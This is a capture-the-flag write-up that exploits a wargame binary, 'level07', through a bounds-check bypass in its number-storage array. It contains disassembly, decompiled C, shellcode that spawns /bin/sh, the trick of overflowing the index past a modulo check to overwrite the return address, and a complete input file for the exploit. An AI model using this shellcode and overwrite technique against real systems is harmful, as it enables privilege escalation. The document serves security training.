What do we have?

	$ ll
	total 21
	dr-xr-x---+ 1 level07 level07    80 Sep 13  2016 ./
	dr-x--x--x  1 root    root      260 Oct  2  2016 ../
	-rw-r--r--  1 level07 level07   220 Sep 10  2016 .bash_logout
	lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
	-rw-r--r--  1 level07 level07  3533 Sep 10  2016 .bashrc
	-rwsr-s---+ 1 level08 users   11744 Sep 10  2016 level07*
	-rw-r--r--+ 1 level07 level07    41 Oct 19  2016 .pass
	-rw-r--r--  1 level07 level07   675 Sep 10  2016 .profile

A `level07` binary. Let's check the assembly:

	$ gdb ./level07
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x08048723 <+0>:     push   %ebp
	0x08048724 <+1>:     mov    %esp,%ebp
	0x08048726 <+3>:     push   %edi
	0x08048727 <+4>:     push   %esi
	0x08048728 <+5>:     push   %ebx
	=> 0x08048729 <+6>:     and    $0xfffffff0,%esp
	0x0804872c <+9>:     sub    $0x1d0,%esp
	0x08048732 <+15>:    mov    0xc(%ebp),%eax
	0x08048735 <+18>:    mov    %eax,0x1c(%esp)
	0x08048739 <+22>:    mov    0x10(%ebp),%eax
	0x0804873c <+25>:    mov    %eax,0x18(%esp)
	0x08048740 <+29>:    mov    %gs:0x14,%eax
	0x08048746 <+35>:    mov    %eax,0x1cc(%esp)
	0x0804874d <+42>:    xor    %eax,%eax
	0x0804874f <+44>:    movl   $0x0,0x1b4(%esp)
	0x0804875a <+55>:    movl   $0x0,0x1b8(%esp)
	0x08048765 <+66>:    movl   $0x0,0x1bc(%esp)
	0x08048770 <+77>:    movl   $0x0,0x1c0(%esp)
	0x0804877b <+88>:    movl   $0x0,0x1c4(%esp)
	0x08048786 <+99>:    movl   $0x0,0x1c8(%esp)
	0x08048791 <+110>:   lea    0x24(%esp),%ebx
	0x08048795 <+114>:   mov    $0x0,%eax
	0x0804879a <+119>:   mov    $0x64,%edx
	0x0804879f <+124>:   mov    %ebx,%edi
	0x080487a1 <+126>:   mov    %edx,%ecx
	0x080487a3 <+128>:   rep stos %eax,%es:(%edi)
	0x080487a5 <+130>:   jmp    0x80487ea <main+199>
	0x080487a7 <+132>:   mov    0x1c(%esp),%eax
	0x080487ab <+136>:   mov    (%eax),%eax
	0x080487ad <+138>:   movl   $0xffffffff,0x14(%esp)
	0x080487b5 <+146>:   mov    %eax,%edx
	0x080487b7 <+148>:   mov    $0x0,%eax
	0x080487bc <+153>:   mov    0x14(%esp),%ecx
	0x080487c0 <+157>:   mov    %edx,%edi
	0x080487c2 <+159>:   repnz scas %es:(%edi),%al
	0x080487c4 <+161>:   mov    %ecx,%eax
	0x080487c6 <+163>:   not    %eax
	0x080487c8 <+165>:   lea    -0x1(%eax),%edx
	0x080487cb <+168>:   mov    0x1c(%esp),%eax
	0x080487cf <+172>:   mov    (%eax),%eax
	0x080487d1 <+174>:   mov    %edx,0x8(%esp)
	0x080487d5 <+178>:   movl   $0x0,0x4(%esp)
	0x080487dd <+186>:   mov    %eax,(%esp)
	0x080487e0 <+189>:   call   0x80484f0 <memset@plt>
	0x080487e5 <+194>:   addl   $0x4,0x1c(%esp)
	0x080487ea <+199>:   mov    0x1c(%esp),%eax
	0x080487ee <+203>:   mov    (%eax),%eax
	0x080487f0 <+205>:   test   %eax,%eax
	0x080487f2 <+207>:   jne    0x80487a7 <main+132>
	0x080487f4 <+209>:   jmp    0x8048839 <main+278>
	0x080487f6 <+211>:   mov    0x18(%esp),%eax
	0x080487fa <+215>:   mov    (%eax),%eax
	0x080487fc <+217>:   movl   $0xffffffff,0x14(%esp)
	0x08048804 <+225>:   mov    %eax,%edx
	0x08048806 <+227>:   mov    $0x0,%eax
	0x0804880b <+232>:   mov    0x14(%esp),%ecx
	0x0804880f <+236>:   mov    %edx,%edi
	0x08048811 <+238>:   repnz scas %es:(%edi),%al
	0x08048813 <+240>:   mov    %ecx,%eax
	0x08048815 <+242>:   not    %eax
	0x08048817 <+244>:   lea    -0x1(%eax),%edx
	0x0804881a <+247>:   mov    0x18(%esp),%eax
	0x0804881e <+251>:   mov    (%eax),%eax
	0x08048820 <+253>:   mov    %edx,0x8(%esp)
	0x08048824 <+257>:   movl   $0x0,0x4(%esp)
	0x0804882c <+265>:   mov    %eax,(%esp)
	0x0804882f <+268>:   call   0x80484f0 <memset@plt>
	0x08048834 <+273>:   addl   $0x4,0x18(%esp)
	0x08048839 <+278>:   mov    0x18(%esp),%eax
	0x0804883d <+282>:   mov    (%eax),%eax
	0x0804883f <+284>:   test   %eax,%eax
	0x08048841 <+286>:   jne    0x80487f6 <main+211>
	0x08048843 <+288>:   movl   $0x8048b38,(%esp)
	0x0804884a <+295>:   call   0x80484c0 <puts@plt>
	0x0804884f <+300>:   mov    $0x8048d4b,%eax
	0x08048854 <+305>:   mov    %eax,(%esp)
	0x08048857 <+308>:   call   0x8048470 <printf@plt>
	0x0804885c <+313>:   movl   $0x1,0x1b4(%esp)
	0x08048867 <+324>:   mov    0x804a040,%eax
	0x0804886c <+329>:   mov    %eax,0x8(%esp)
	0x08048870 <+333>:   movl   $0x14,0x4(%esp)
	0x08048878 <+341>:   lea    0x1b8(%esp),%eax
	0x0804887f <+348>:   mov    %eax,(%esp)
	0x08048882 <+351>:   call   0x80484a0 <fgets@plt>
	0x08048887 <+356>:   lea    0x1b8(%esp),%eax
	0x0804888e <+363>:   movl   $0xffffffff,0x14(%esp)
	0x08048896 <+371>:   mov    %eax,%edx
	0x08048898 <+373>:   mov    $0x0,%eax
	0x0804889d <+378>:   mov    0x14(%esp),%ecx
	0x080488a1 <+382>:   mov    %edx,%edi
	0x080488a3 <+384>:   repnz scas %es:(%edi),%al
	0x080488a5 <+386>:   mov    %ecx,%eax
	0x080488a7 <+388>:   not    %eax
	0x080488a9 <+390>:   sub    $0x1,%eax
	0x080488ac <+393>:   sub    $0x1,%eax
	0x080488af <+396>:   movb   $0x0,0x1b8(%esp,%eax,1)
	0x080488b7 <+404>:   lea    0x1b8(%esp),%eax
	0x080488be <+411>:   mov    %eax,%edx
	0x080488c0 <+413>:   mov    $0x8048d5b,%eax
	0x080488c5 <+418>:   mov    $0x5,%ecx
	0x080488ca <+423>:   mov    %edx,%esi
	0x080488cc <+425>:   mov    %eax,%edi
	0x080488ce <+427>:   repz cmpsb %es:(%edi),%ds:(%esi)
	0x080488d0 <+429>:   seta   %dl
	0x080488d3 <+432>:   setb   %al
	0x080488d6 <+435>:   mov    %edx,%ecx
	0x080488d8 <+437>:   sub    %al,%cl
	0x080488da <+439>:   mov    %ecx,%eax
	0x080488dc <+441>:   movsbl %al,%eax
	0x080488df <+444>:   test   %eax,%eax
	0x080488e1 <+446>:   jne    0x80488f8 <main+469>
	0x080488e3 <+448>:   lea    0x24(%esp),%eax
	0x080488e7 <+452>:   mov    %eax,(%esp)
	0x080488ea <+455>:   call   0x8048630 <store_number>
	0x080488ef <+460>:   mov    %eax,0x1b4(%esp)
	0x080488f6 <+467>:   jmp    0x8048965 <main+578>
	0x080488f8 <+469>:   lea    0x1b8(%esp),%eax
	0x080488ff <+476>:   mov    %eax,%edx
	0x08048901 <+478>:   mov    $0x8048d61,%eax
	0x08048906 <+483>:   mov    $0x4,%ecx
	0x0804890b <+488>:   mov    %edx,%esi
	0x0804890d <+490>:   mov    %eax,%edi
	0x0804890f <+492>:   repz cmpsb %es:(%edi),%ds:(%esi)
	0x08048911 <+494>:   seta   %dl
	0x08048914 <+497>:   setb   %al
	0x08048917 <+500>:   mov    %edx,%ecx
	0x08048919 <+502>:   sub    %al,%cl
	0x0804891b <+504>:   mov    %ecx,%eax
	0x0804891d <+506>:   movsbl %al,%eax
	0x08048920 <+509>:   test   %eax,%eax
	0x08048922 <+511>:   jne    0x8048939 <main+534>
	0x08048924 <+513>:   lea    0x24(%esp),%eax
	0x08048928 <+517>:   mov    %eax,(%esp)
	0x0804892b <+520>:   call   0x80486d7 <read_number>
	0x08048930 <+525>:   mov    %eax,0x1b4(%esp)
	0x08048937 <+532>:   jmp    0x8048965 <main+578>
	0x08048939 <+534>:   lea    0x1b8(%esp),%eax
	0x08048940 <+541>:   mov    %eax,%edx
	0x08048942 <+543>:   mov    $0x8048d66,%eax
	0x08048947 <+548>:   mov    $0x4,%ecx
	0x0804894c <+553>:   mov    %edx,%esi
	0x0804894e <+555>:   mov    %eax,%edi
	0x08048950 <+557>:   repz cmpsb %es:(%edi),%ds:(%esi)
	0x08048952 <+559>:   seta   %dl
	0x08048955 <+562>:   setb   %al
	0x08048958 <+565>:   mov    %edx,%ecx
	0x0804895a <+567>:   sub    %al,%cl
	0x0804895c <+569>:   mov    %ecx,%eax
	0x0804895e <+571>:   movsbl %al,%eax
	0x08048961 <+574>:   test   %eax,%eax
	0x08048963 <+576>:   je     0x80489cf <main+684>
	0x08048965 <+578>:   cmpl   $0x0,0x1b4(%esp)
	0x0804896d <+586>:   je     0x8048989 <main+614>
	0x0804896f <+588>:   mov    $0x8048d6b,%eax
	0x08048974 <+593>:   lea    0x1b8(%esp),%edx
	0x0804897b <+600>:   mov    %edx,0x4(%esp)
	0x0804897f <+604>:   mov    %eax,(%esp)
	0x08048982 <+607>:   call   0x8048470 <printf@plt>
	0x08048987 <+612>:   jmp    0x80489a1 <main+638>
	0x08048989 <+614>:   mov    $0x8048d88,%eax
	0x0804898e <+619>:   lea    0x1b8(%esp),%edx
	0x08048995 <+626>:   mov    %edx,0x4(%esp)
	0x08048999 <+630>:   mov    %eax,(%esp)
	0x0804899c <+633>:   call   0x8048470 <printf@plt>
	0x080489a1 <+638>:   lea    0x1b8(%esp),%eax
	0x080489a8 <+645>:   movl   $0x0,(%eax)
	0x080489ae <+651>:   movl   $0x0,0x4(%eax)
	0x080489b5 <+658>:   movl   $0x0,0x8(%eax)
	0x080489bc <+665>:   movl   $0x0,0xc(%eax)
	0x080489c3 <+672>:   movl   $0x0,0x10(%eax)
	0x080489ca <+679>:   jmp    0x804884f <main+300>
	0x080489cf <+684>:   nop
	0x080489d0 <+685>:   mov    $0x0,%eax
	0x080489d5 <+690>:   mov    0x1cc(%esp),%esi
	0x080489dc <+697>:   xor    %gs:0x14,%esi
	0x080489e3 <+704>:   je     0x80489ea <main+711>
	0x080489e5 <+706>:   call   0x80484b0 <__stack_chk_fail@plt>
	0x080489ea <+711>:   lea    -0xc(%ebp),%esp
	0x080489ed <+714>:   pop    %ebx
	0x080489ee <+715>:   pop    %esi
	0x080489ef <+716>:   pop    %edi
	0x080489f0 <+717>:   pop    %ebp
	0x080489f1 <+718>:   ret
	End of assembler dump.

	(gdb) info functions
	[...]
	0x080485c4  clear_stdin
	0x080485e7  get_unum
	0x0804861f  prog_timeout
	0x08048630  store_number
	0x080486d7  read_number
	0x08048723  main

	(gdb) disas clear_stdin
	Dump of assembler code for function clear_stdin:
	0x080485c4 <+0>:     push   %ebp
	0x080485c5 <+1>:     mov    %esp,%ebp
	0x080485c7 <+3>:     sub    $0x18,%esp
	0x080485ca <+6>:     movb   $0x0,-0x9(%ebp)
	0x080485ce <+10>:    jmp    0x80485d1 <clear_stdin+13>
	0x080485d0 <+12>:    nop
	0x080485d1 <+13>:    call   0x8048490 <getchar@plt>
	0x080485d6 <+18>:    mov    %al,-0x9(%ebp)
	0x080485d9 <+21>:    cmpb   $0xa,-0x9(%ebp)
	0x080485dd <+25>:    je     0x80485e5 <clear_stdin+33>
	0x080485df <+27>:    cmpb   $0xff,-0x9(%ebp)
	0x080485e3 <+31>:    jne    0x80485d0 <clear_stdin+12>
	0x080485e5 <+33>:    leave
	0x080485e6 <+34>:    ret
	End of assembler dump.

	(gdb) disas get_unum
	Dump of assembler code for function get_unum:
	0x080485e7 <+0>:     push   %ebp
	0x080485e8 <+1>:     mov    %esp,%ebp
	0x080485ea <+3>:     sub    $0x28,%esp
	0x080485ed <+6>:     movl   $0x0,-0xc(%ebp)
	0x080485f4 <+13>:    mov    0x804a060,%eax
	0x080485f9 <+18>:    mov    %eax,(%esp)
	0x080485fc <+21>:    call   0x8048480 <fflush@plt>
	0x08048601 <+26>:    mov    $0x8048ad0,%eax
	0x08048606 <+31>:    lea    -0xc(%ebp),%edx
	0x08048609 <+34>:    mov    %edx,0x4(%esp)
	0x0804860d <+38>:    mov    %eax,(%esp)
	0x08048610 <+41>:    call   0x8048500 <__isoc99_scanf@plt>
	0x08048615 <+46>:    call   0x80485c4 <clear_stdin>
	0x0804861a <+51>:    mov    -0xc(%ebp),%eax
	0x0804861d <+54>:    leave
	0x0804861e <+55>:    ret
	End of assembler dump.

	(gdb) disas prog_timeout
	Dump of assembler code for function prog_timeout:
	0x0804861f <+0>:     push   %ebp
	0x08048620 <+1>:     mov    %esp,%ebp
	0x08048622 <+3>:     mov    $0x1,%eax
	0x08048627 <+8>:     mov    $0x1,%ebx
	0x0804862c <+13>:    int    $0x80
	0x0804862e <+15>:    pop    %ebp
	0x0804862f <+16>:    ret
	End of assembler dump.

	(gdb) disas store_number
	Dump of assembler code for function store_number:
	0x08048630 <+0>:     push   %ebp
	0x08048631 <+1>:     mov    %esp,%ebp
	0x08048633 <+3>:     sub    $0x28,%esp
	0x08048636 <+6>:     movl   $0x0,-0x10(%ebp)
	0x0804863d <+13>:    movl   $0x0,-0xc(%ebp)
	0x08048644 <+20>:    mov    $0x8048ad3,%eax
	0x08048649 <+25>:    mov    %eax,(%esp)
	0x0804864c <+28>:    call   0x8048470 <printf@plt>
	0x08048651 <+33>:    call   0x80485e7 <get_unum>
	0x08048656 <+38>:    mov    %eax,-0x10(%ebp)
	0x08048659 <+41>:    mov    $0x8048add,%eax
	0x0804865e <+46>:    mov    %eax,(%esp)
	0x08048661 <+49>:    call   0x8048470 <printf@plt>
	0x08048666 <+54>:    call   0x80485e7 <get_unum>
	0x0804866b <+59>:    mov    %eax,-0xc(%ebp)
	0x0804866e <+62>:    mov    -0xc(%ebp),%ecx
	0x08048671 <+65>:    mov    $0xaaaaaaab,%edx
	0x08048676 <+70>:    mov    %ecx,%eax
	0x08048678 <+72>:    mul    %edx
	0x0804867a <+74>:    shr    %edx
	0x0804867c <+76>:    mov    %edx,%eax
	0x0804867e <+78>:    add    %eax,%eax
	0x08048680 <+80>:    add    %edx,%eax
	0x08048682 <+82>:    mov    %ecx,%edx
	0x08048684 <+84>:    sub    %eax,%edx
	0x08048686 <+86>:    test   %edx,%edx
	0x08048688 <+88>:    je     0x8048697 <store_number+103>
	0x0804868a <+90>:    mov    -0x10(%ebp),%eax
	0x0804868d <+93>:    shr    $0x18,%eax
	0x08048690 <+96>:    cmp    $0xb7,%eax
	0x08048695 <+101>:   jne    0x80486c2 <store_number+146>
	0x08048697 <+103>:   movl   $0x8048ae6,(%esp)
	0x0804869e <+110>:   call   0x80484c0 <puts@plt>
	0x080486a3 <+115>:   movl   $0x8048af8,(%esp)
	0x080486aa <+122>:   call   0x80484c0 <puts@plt>
	0x080486af <+127>:   movl   $0x8048ae6,(%esp)
	0x080486b6 <+134>:   call   0x80484c0 <puts@plt>
	0x080486bb <+139>:   mov    $0x1,%eax
	0x080486c0 <+144>:   jmp    0x80486d5 <store_number+165>
	0x080486c2 <+146>:   mov    -0xc(%ebp),%eax
	0x080486c5 <+149>:   shl    $0x2,%eax
	0x080486c8 <+152>:   add    0x8(%ebp),%eax
	0x080486cb <+155>:   mov    -0x10(%ebp),%edx
	0x080486ce <+158>:   mov    %edx,(%eax)
	0x080486d0 <+160>:   mov    $0x0,%eax
	0x080486d5 <+165>:   leave
	0x080486d6 <+166>:   ret
	End of assembler dump.

	(gdb) disas read_number
	Dump of assembler code for function read_number:
	0x080486d7 <+0>:     push   %ebp
	0x080486d8 <+1>:     mov    %esp,%ebp
	0x080486da <+3>:     sub    $0x28,%esp
	0x080486dd <+6>:     movl   $0x0,-0xc(%ebp)
	0x080486e4 <+13>:    mov    $0x8048add,%eax
	0x080486e9 <+18>:    mov    %eax,(%esp)
	0x080486ec <+21>:    call   0x8048470 <printf@plt>
	0x080486f1 <+26>:    call   0x80485e7 <get_unum>
	0x080486f6 <+31>:    mov    %eax,-0xc(%ebp)
	0x080486f9 <+34>:    mov    -0xc(%ebp),%eax
	0x080486fc <+37>:    shl    $0x2,%eax
	0x080486ff <+40>:    add    0x8(%ebp),%eax
	0x08048702 <+43>:    mov    (%eax),%edx
	0x08048704 <+45>:    mov    $0x8048b1b,%eax
	0x08048709 <+50>:    mov    %edx,0x8(%esp)
	0x0804870d <+54>:    mov    -0xc(%ebp),%edx
	0x08048710 <+57>:    mov    %edx,0x4(%esp)
	0x08048714 <+61>:    mov    %eax,(%esp)
	0x08048717 <+64>:    call   0x8048470 <printf@plt>
	0x0804871c <+69>:    mov    $0x0,%eax
	0x08048721 <+74>:    leave
	0x08048722 <+75>:    ret
	End of assembler dump.

Cleaned `Ghidra`:

	char *DAT_08048d61 = "read"
	char *DAT_08048d66 = "quit"

Two global strings.

	void	clear_stdin(void)
	{
		int	iVar1;
		
		do
		{
			iVar1 = getchar();
			if ((char)iVar1 == '\n')
				return;
		} while ((char)iVar1 != -1);
		return;
	}

Clear stdin.

	int	get_unum(void)
	{
		unsigned int	local_10;
		
		local_10 = 0;
		fflush(stdout);
		scanf("%u", &local_10);
		clear_stdin();
		return (local_10);
	}

Read a number from the user.

	void	prog_timeout(int signum)
	{
		syscall(SYS_exit, 1);
		return;
	}

Timeout.

	int	store_number(unsigned int *param_1)
	{
		unsigned int	uVar1;
		unsigned int	uVar2;
		int				uVar3;
		
		printf(" Number: ");
		uVar1 = get_unum();
		printf(" Index: ");
		uVar2 = get_unum();
		if ((uVar2 % 3 == 0) || (uVar1 >> 24 == 0xb7))
		{
			puts(" *** ERROR! ***");
			puts("	 This index is reserved for wil!");
			puts(" *** ERROR! ***");
			uVar3 = 1;
		}
		else
		{
			*(unsigned int *)(uVar2 * 4 + param_1) = uVar1;
			uVar3 = 0;
		}
		return (uVar3);
	}

Take two inputs, one for a number, and one for an index. If the number upper bits are equals to `0xb7` (0xb7000000 to 0xb7ffffff, so 3070230528 to 3087007743) or if the index is a multiple of 3, error. What's interesting is that it will multiply our index by 4 to find the place it's supposed to be stored, as it uses bytes to navigate.

	int	read_number(unsigned int *param_1)
	{
		int	iVar1;
		
		printf(" Index: ");
		iVar1 = get_unum();
		printf(" Number at data[%u] is %u\n", iVar1, *(int *)(iVar1 * 4 + param_1));
		return (0);
	}

Print the number at the index we ask.

	int main(int param_1, int *param_2, int *param_3)
	{
		char			cVar1;
		char			bVar2;
		int				iVar3;
		unsigned int	uVar4;
		char			*pbVar5;
		int				*puVar6;
		char			*pcVar7;
		char			*pbVar8;
		int				in_GS_OFFSET;
		bool			bVar9;
		bool			bVar10;
		bool			bVar11;
		char			bVar12;
		int				*local_1c8;
		int				*local_1c4;
		unsigned int	local_1bc[100];
		int				local_2c;
		char			local_28[20];
		int				local_14;
		
		bVar12 = 0;
		local_1c4 = param_2;
		local_1c8 = param_3;
		local_14 = *(int *)(in_GS_OFFSET + 20);
		local_2c = 0;
		local_28[0] = 0;
		local_28[1] = 0;
		local_28[2] = 0;
		local_28[3] = 0;
		local_28[4] = 0;
		local_28[5] = 0;
		local_28[6] = 0;
		local_28[7] = 0;
		local_28[8] = 0;
		local_28[9] = 0;
		local_28[10] = 0;
		local_28[11] = 0;
		local_28[12] = 0;
		local_28[13] = 0;
		local_28[14] = 0;
		local_28[15] = 0;
		local_28[16] = 0;
		local_28[17] = 0;
		local_28[18] = 0;
		local_28[19] = 0;
		puVar6 = local_1bc;
		for (iVar3 = 100; iVar3 != 0; iVar3--)
		{
			*puVar6 = 0;
			puVar6++;
		}

Init vars.

		for (; *local_1c4 != 0; local_1c4++)
		{
			uVar4 = 0xffffffff;
			pcVar7 = (char *)*local_1c4;
			do
			{
				if (uVar4 == 0)
					break;
				uVar4--;
				cVar1 = *pcVar7;
				pcVar7++;
			} while (cVar1 != '\0');
			memset((void *)*local_1c4, 0, ~uVar4 - 1);
		}
		for (; *local_1c8 != 0; local_1c8++)
		{
			uVar4 = 0xffffffff;
			pcVar7 = (char *)*local_1c8;
			do
			{
				if (uVar4 == 0)
					break;
				uVar4--;
				cVar1 = *pcVar7;
				pcVar7++;
			} while (cVar1 != '\0');
			memset((void *)*local_1c8, 0, ~uVar4 - 1);
		}

`memset` to 0 our arguments and env.

		puts(
				"----------------------------------------------------\n  Welcome to wil\'s crappy number storage service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------------------------\n"
		);

User's helper for main loop.

		do
		{
			printf("Input command: ");
			local_2c = 1;
			fgets((char *)local_28, 20, stdin);

`fgets` our command into `local_28`.

			uVar4 = 0xffffffff;
			pbVar5 = local_28;
			do
			{
				if (uVar4 == 0)
					break;
				uVar4--;
				bVar2 = *pbVar5;
				pbVar5++;
			} while (bVar2 != 0);
			uVar4 = ~uVar4;
			bVar9 = uVar4 == 1;
			bVar11 = uVar4 == 2;
			*(char *)((int)&local_2c + uVar4 + 2) = 0;
			iVar3 = 5;
			pbVar5 = local_28;
			pbVar8 = (char *)"store";
			do
			{
				if (iVar3 == 0)
					break;
				iVar3--;
				bVar9 = *pbVar5 < *pbVar8;
				bVar11 = *pbVar5 == *pbVar8;
				pbVar5++;
				pbVar8++;
			} while (bVar11);
			bVar10 = false;
			bVar9 = (!bVar9 && !bVar11) == bVar9;
			if (bVar9)
				local_2c = store_number(local_1bc);

Check that it is `store`, and call the `store_number` function with `local_1bc` if true.

			else
			{
				iVar3 = 4;
				pbVar5 = local_28;
				pbVar8 = &DAT_08048d61;
				do
				{
					if (iVar3 == 0)
						break;
					iVar3 = iVar3 + -1;
					bVar10 = *pbVar5 < *pbVar8;
					bVar9 = *pbVar5 == *pbVar8;
					pbVar5++;
					pbVar8++;
				} while (bVar9);
				bVar11 = false;
				bVar9 = (!bVar10 && !bVar9) == bVar10;
				if (bVar9)
					local_2c = read_number(local_1bc);

Check that it is `read`, and call the `read_number` function with `local_1bc` if true.

				else
				{
					iVar3 = 4;
					pbVar5 = local_28;
					pbVar8 = &DAT_08048d66;
					do
					{
						if (iVar3 == 0)
							break;
						iVar3--;
						bVar11 = *pbVar5 < *pbVar8;
						bVar9 = *pbVar5 == *pbVar8;
						pbVar5++;
						pbVar8++;
					} while (bVar9);
					if ((!bVar11 && !bVar9) == bVar11)
					{
						if (local_14 == *(int *)(in_GS_OFFSET + 20))
							return (0);
						__stack_chk_fail();
					}
				}

Check that is it `quit`, and quit the program if true.

			}
			if (local_2c == 0)
				printf(" Completed %s command successfully\n", local_28);
			else
				printf(" Failed to do %s command\n", local_28);
			local_28[0] = 0;
			local_28[1] = 0;
			local_28[2] = 0;
			local_28[3] = 0;
			local_28[4] = 0;
			local_28[5] = 0;
			local_28[6] = 0;
			local_28[7] = 0;
			local_28[8] = 0;
			local_28[9] = 0;
			local_28[10] = 0;
			local_28[11] = 0;
			local_28[12] = 0;
			local_28[13] = 0;
			local_28[14] = 0;
			local_28[15] = 0;
			local_28[16] = 0;
			local_28[17] = 0;
			local_28[18] = 0;
			local_28[19] = 0;
		} while (1);
	}

Notice user about the status, reset `local_28`, and loop.

So, we have to overwrite `eip` by storing a number at an index that will overflow the array.

First, let's get our usual shellcode (`\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80`), and convert it into unsigned ints.

	\x31\xc0\x31\xdb => 0xdb31c031 => 3677470769
	\xb0\x06\xcd\x80 => 0x80cd06b0 => 2160920240
	\x53\x68\x2f\x74 => 0x742f6853 => 1949263955
	\x74\x79\x68\x2f => 0x2f687974 => 795375988
	\x64\x65\x76\x89 => 0x89766564 => 2306237796
	\xe3\x31\xc9\x66 => 0x66c931e3 => 1724461539
	\xb9\x12\x27\xb0 => 0xb02712b9 => 2955350713
	\x05\xcd\x80\x31 => 0x3180cd05 => 830524677
	\xc0\x50\x68\x2f => 0x2f6850c0 => 795365568
	\x2f\x73\x68\x68 => 0x6868732f => 1751675695
	\x2f\x62\x69\x6e => 0x6e69622f => 1852400175
	\x89\xe3\x50\x53 => 0x5350e389 => 1397810057
	\x89\xe1\x99\xb0 => 0xb099e189 => 2962874761
	\x0b\xcd\x80     => 0x80cd0b   => 8441099

Then, we need to store them at the start of the buffer. We'll start with `3677474865` at `array[0]`, but it won't pass the check of `index % 3 == 0`, so we'll have to take advantage of how it's searching for the index, by overflowing it. 4294967295 (uint max) + 1 = 4294967296 (0) / 4 = 1073741824. By giving this number as the index, it'll pass the check but still store it where we want.

	$ ./level07
	----------------------------------------------------
	Welcome to wil's crappy number storage service!
	----------------------------------------------------
	Commands:
		store - store a number into the data storage
		read  - read a number from the data storage
		quit  - exit the program
	----------------------------------------------------
	wil has reserved some storage :>
	----------------------------------------------------

	Input command: store
	Number: 3677474865
	Index: 1073741824
	Completed store command successfully
	Input command: read
	Index: 0
	Number at data[0] is 3677474865
	Completed read command successfully

We'll have to do the same for all subsequents numbers; if the index is a multiple of 2 or 4 we'll simply use the true index, but if it's a multiple of 3 we'll overflow it. With that, the shellcode can be entirely placed. Now, we need the address of the buffer.

	$ gdb ./level07
	[...]
	(gdb) b read_number
	[...]
	(gdb) r
	Starting program: /home/users/level07/level07
	----------------------------------------------------
	Welcome to wil's crappy number storage service!
	----------------------------------------------------
	Commands:
		store - store a number into the data storage
		read  - read a number from the data storage
		quit  - exit the program
	----------------------------------------------------
	wil has reserved some storage :>
	----------------------------------------------------

	Input command: read

	Breakpoint 1, 0x080486dd in read_number ()
	(gdb) x $ebp+0x8
	0xffffd530:     0xffffd554

`0xffffd554` => 4294956372.

Then, the offset for `eip`.

	$ gdb ./level07
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) n
	Single stepping until exit from function main,
	which has no line number information.
	----------------------------------------------------
	Welcome to wil's crappy number storage service!
	----------------------------------------------------
	Commands:
		store - store a number into the data storage
		read  - read a number from the data storage
		quit  - exit the program
	----------------------------------------------------
	wil has reserved some storage :>
	----------------------------------------------------
	Input command: read
	Index: 101
	Number at data[101] is 1684104562
	Completed read command successfully
	Input command: read
	Index: 102
	Number at data[102] is 0
	Completed read command successfully
	Input command: read
	Index: 103
	Number at data[103] is 0
	Completed read command successfully
	Input command: read
	Index: 104
	Number at data[104] is 0
	Completed read command successfully
	Input command: read
	Index: 105
	Number at data[105] is 0
	Completed read command successfully
	Input command: read
	Index: 106
	Number at data[106] is 741524992
	Completed read command successfully
	Input command: read
	Index: 107
	Number at data[107] is 4160665120
	Completed read command successfully
	Input command: read
	Index: 108
	Number at data[108] is 0
	Completed read command successfully
	Input command: read
	Index: 109
	Number at data[109] is 134515209
	Completed read command successfully
	Input command: read
	Index: 110
	Number at data[110] is 4160548852
	Completed read command successfully
	Input command: read
	Index: 111
	Number at data[111] is 0
	Completed read command successfully
	Input command: read
	Index: 112
	Number at data[112] is 0
	Completed read command successfully
	Input command: read
	Index: 113
	Number at data[113] is 0
	Completed read command successfully
	Input command: read
	Index: 114
	Number at data[114] is 4158936339
	Completed read command successfully
	Input command: read
	Index: 115
	Number at data[115] is 1
	Completed read command successfully

	1684104562 => 0x646e6172
	741524992  => 0x2c353030
	4160665120 => 0xf7fce000
	134515209  => 0x08048989
	4160548852 => 0xf7fb1a34
	4158936339 => 0xf7e2c6b3

`0x0804<?>` is from the data/BSS segment, while `0xf7<?>` are from the almost start of the stack; typically from the libc. As our main is actually not the entrypoint of our program but something from the libc, we'll try to overwrite the `0xf7` ones, one by one to see which one it is.

	$ ./level07
	[...]
	Input command: store
	Number: 999999999
	Index: 107
	Completed store command successfully
	Input command: quit
	$

Not that one.

	$ ./level07
	[...]
	Input command: store
	Number: 999999999
	Index: 110
	Completed store command successfully
	Input command: quit
	$

Not this one either.

	$ ./level07
	[...]
	Input command: store
	Number: 999999999
	Index: 1073741938
	Completed store command successfully
	Input command: quit
	0x3b9ac9ff in ?? ()

Seems like we have a winner. Now, about the shellcode. First, the address of the buffer is kinda wrong, as it's under `gdb`, which adds his own things. So, we'll add a tiny NOP sled in front of our shellcode and add a few bytes to the address we have, hoping it'll fix the shift. 4294956372 => 4294956404.

	$ nano /tmp/i
	
<!-- The following text is to simplify the copy/paste during tests. The markdown format breaks the newline that are supposed to be at the end of each word, so copy from the raw file -->

store
2425393296
1073741824
store
2425393296
1
store
2425393296
2
store
2425393296
1073741827
store
3677470769
4
store
2160920240
5
store
1949263955
1073741830
store
795375988
7
store
2306237796
8
store
1724461539
1073741833
store
2955350713
10
store
830524677
11
store
795365568
1073741836
store
1751675695
13
store
1852400175
14
store
1397810057
1073741839
store
2962874761
16
store
8441099
17
store
4294956404
1073741938

	$ (cat /tmp/i; cat -) | ./level07
	----------------------------------------------------
	Welcome to wil's crappy number storage service!
	----------------------------------------------------
	Commands:
		store - store a number into the data storage
		read  - read a number from the data storage
		quit  - exit the program
	----------------------------------------------------
	wil has reserved some storage :>
	----------------------------------------------------

	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
